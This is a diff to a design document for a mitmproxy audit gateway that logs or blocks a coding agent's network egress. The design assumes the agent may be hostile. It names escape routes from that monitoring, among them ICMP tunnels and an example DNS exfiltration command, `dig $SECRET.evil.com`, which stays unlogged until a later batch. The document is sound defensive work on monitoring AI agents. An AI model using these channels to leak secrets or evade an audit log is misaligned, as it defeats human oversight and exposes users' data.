@@ -15,8 +15,10 @@ Two orthogonal guarantees (see `docs/audit-concepts.md`):
 
 - **Completeness (hard).** The agent is placed on an `internal` Docker network
   with no route to the internet; a **transparent audit gateway** sidecar
-  (mitmproxy, `NET_ADMIN` scoped to the sidecar) is its only path out and logs
-  every destination — even for a hostile agent that ignores proxy settings.
+  (mitmproxy, `NET_ADMIN` scoped to the sidecar) is its only path out. It logs
+  every outbound TCP connection by destination and refuses UDP, ICMP and IPv6,
+  even for a hostile agent that ignores proxy settings. DNS is the remaining
+  unlogged channel until Batch 3 (§3.1).
 - **Depth (soft, opt-in).** `--audit-decrypt` adds TLS interception for flows
   whose client trusts the session CA (the *honest* flows), capturing method/path/
   status. Flows that pin or reject the CA are **passed through opaque but still
@@ -52,7 +54,10 @@ decryption) — a compliance artifact with minimal PII surface.
                                         ▼
                           [ audit-gw: mitmproxy ]
                             cap_add: NET_ADMIN (sidecar only)
-                            iptables REDIRECT :80→8080 :443→8080
+                            iptables: all TCP → REDIRECT :8080
+                                      UDP/ICMP/other → REJECT (counted)
+                                      udp/53 allowed (DNS, Batch 3)
+                            IPv6 off (sysctls + ip6tables REJECT)
                             transparent mode, SNI/CONNECT logging
                                         │ default (bridge) net
                                         ▼
@@ -64,8 +69,28 @@ decryption) — a compliance artifact with minimal PII surface.
 
 - Agent has **no** route to the internet except through `audit-gw` (internal net
   removes the default gateway; the sidecar re-supplies it).
-- Non-forwarded / non-routable traffic simply cannot leave → nothing escapes
-  unlogged (completeness by construction, NFR-3).
+- What leaves, precisely (Batch 2). Loopback and uid 0 (the gateway's own
+  mitmproxy) are exempt; for every other uid, i.e. the agent:
+  - **TCP, any port:** every new outbound connection is REDIRECTed to mitmproxy
+    and logged by destination. Destination-only mode passes all of it through
+    opaque at once (`ignore_hosts=.*`), so server-speaks-first protocols (SSH,
+    SMTP, databases) work. Decrypt mode intercepts only :80/:443 and passes the
+    other ports through the same way (`ignore_hosts` on `host:port`).
+  - **UDP (incl. QUIC), ICMP, every other protocol:** REJECTed in filter
+    OUTPUT, not DROPped, so clients fail or fall back to TCP at once. The
+    counters go into the log as a `blocked` record at shutdown (§5.1). This
+    also closes ICMP tunnels: Docker's default `ping_group_range` lets an
+    unprivileged uid ping without `NET_RAW`.
+  - **IPv6:** disabled by compose `sysctls` on `audit-gw` (the agent shares
+    its netns); `ip6tables` rejects everything but loopback as a second layer.
+    The entrypoint refuses to start if IPv6 is still on.
+  - **DNS (udp/53):** still allowed and **not logged**. Queries to Docker's
+    embedded resolver (127.0.0.11, via loopback) are resolved by dockerd
+    outside the netns, so `dig $SECRET.evil.com` is an unlogged channel until
+    Batch 3 adds DNS logging.
+- Hence the claim is "every TCP connection is logged; everything else except
+  DNS is refused" (completeness by construction, NFR-3), not "all egress is
+  logged".
 
 ### 3.2 With litellm sidecar (tier-2 providers)
 
@@ -115,8 +140,8 @@ decrypt path, MITM CA-accepting flows and pass through the rest.
 - Caps: `cap_add: [NET_ADMIN]` only; inherits base `cap_drop: ALL` +
   `no-new-privileges` for everything else (NFR-9). *Verify* NET_ADMIN alone
   suffices for the iptables REDIRECT; add nothing broader.
-- Entry: an addon/script that (a) sets iptables REDIRECT for :80/:443 → mitmproxy
-  listener, (b) runs mitmproxy in `transparent` mode (destination-only) or with
+- Entry: an addon/script that (a) REDIRECTs all agent TCP to the mitmproxy
+  listener and REJECTs all other agent egress except DNS (§3.1), (b) runs mitmproxy in `transparent` mode (destination-only) or with
   decryption enabled (`--audit-decrypt`), (c) writes JSONL via a mitmproxy addon.
 - Networks: `internal` (agent-facing) + `default` (egress).
 - Log target: a private work dir bind-mounted **into this service only**,
@@ -289,13 +314,13 @@ Guards:
 |-----|--------------------|
 | NFR-1 redaction | Destination-only mode records no path/header/body by construction. Decrypt-mode addon strips `Authorization`/`Proxy-Authorization`, API keys, query tokens; never writes bodies. |
 | NFR-2 cert-pinning | Decrypt path injects the CA (`NODE_EXTRA_CA_CERTS` for Claude Code/Node). Verification step in Build & Test: confirm the agent's *own* provider calls still succeed under decrypt; D2 pass-through prevents a pinned provider call from breaking the run. |
-| NFR-3 completeness | Internal net removes the agent's egress; sidecar is the sole route (D1-A). All escaping traffic is logged. Documented caveats: metadata mode can't see content; IP-literals logged by IP; guarantee holds only for the gateway topology → FR-7 refuses host-net. |
+| NFR-3 completeness | The agent shares the sidecar's netns and holds no `NET_ADMIN`, so the sidecar's rules are its only way out (D1-A). Every outbound TCP connection is logged; UDP, ICMP, IPv6 and other protocols are rejected and counted (§3.1). Documented caveats: DNS is allowed and unlogged until Batch 3; metadata mode can't see content; IP-literals logged by IP; guarantee holds only for the gateway topology → FR-7 refuses host-net. |
 | NFR-4 tamper-resistance | During the session the log is on a **sidecar-only** bind mount (D3). Afterwards it is exported to a deny-listed host dir (0700/0444) that no agent can mount, and a sha256 hash chain, whose head is printed at session end, makes later edits detectable (D7, §5.4). |
 | NFR-5 fail-closed | `depends_on: service_healthy`; no agent launch if gateway unhealthy. `--audit-allow-degraded` opts into fail-open. |
 | NFR-6 pinned image | mitmproxy pinned by digest (D4). |
 | NFR-7 cleanup | Generated fragment, CA material, temp config in `TEMP_FILES`; removed by `cleanup` trap on EXIT/INT/TERM. |
 | NFR-8 testability | `--dry-run` surfaces the fragment; `tests/cli/audit.bats` + `tests/test_audit_summary.py` (+ PBT). |
-| NFR-9 least-privilege | `audit-gw` is `cap_drop: ALL` + `cap_add: [NET_ADMIN, DAC_OVERRIDE]` — NET_ADMIN for the iptables REDIRECT, DAC_OVERRIDE so root can write the log/CA into the host-owned (`mktemp`, uid-1000) bind mount (dropping ALL strips DAC_OVERRIDE, so uid-0 is otherwise blocked by ordinary perms). Both scoped to the sidecar; the agent keeps `cap_drop: ALL`. |
+| NFR-9 least-privilege | `audit-gw` is `cap_drop: ALL` + `cap_add: [NET_ADMIN, DAC_OVERRIDE]` — NET_ADMIN for the iptables REDIRECT/REJECT rules (and reading their counters), DAC_OVERRIDE so root can write the log/CA into the host-owned (`mktemp`, uid-1000) bind mount (dropping ALL strips DAC_OVERRIDE, so uid-0 is otherwise blocked by ordinary perms). Both scoped to the sidecar; the agent keeps `cap_drop: ALL`. |
 | NFR-10 hard vs soft | Completeness (routing) unbypassable; decryption (CA trust) cooperative. Docs/`--help` never call `--audit-decrypt` unbypassable; pass-through default keeps completeness when decrypt fails. |
 
 ## 9. Test design (for Build & Test)
@@ -307,6 +332,10 @@ Guards:
   - `--audit-decrypt-fail-closed` / `--audit-decrypt` without `--audit` errors.
   - `--air-gap --audit` adds no external gateway leg.
   - agent `depends_on: audit-gw` healthy (fail-closed); `--audit-allow-degraded` drops it.
+  - `audit-gw` (and only it) gets the IPv6-off and `route_localnet` sysctls;
+    the real `entrypoint.sh` run against fake `iptables`/`mitmdump` installs
+    the redirect and reject rules before mitmdump starts, and fails closed when
+    IPv6 is on or a rule can't be installed.
 - **`tests/test_audit_summary.py`** (host-side unit + PBT, NFR-8/PBT-02/03/07/08/09):
   - round-trip: serialize records → parse → summary counts match (PBT).
   - malformed/partial lines are skipped without crashing (PBT robustness).
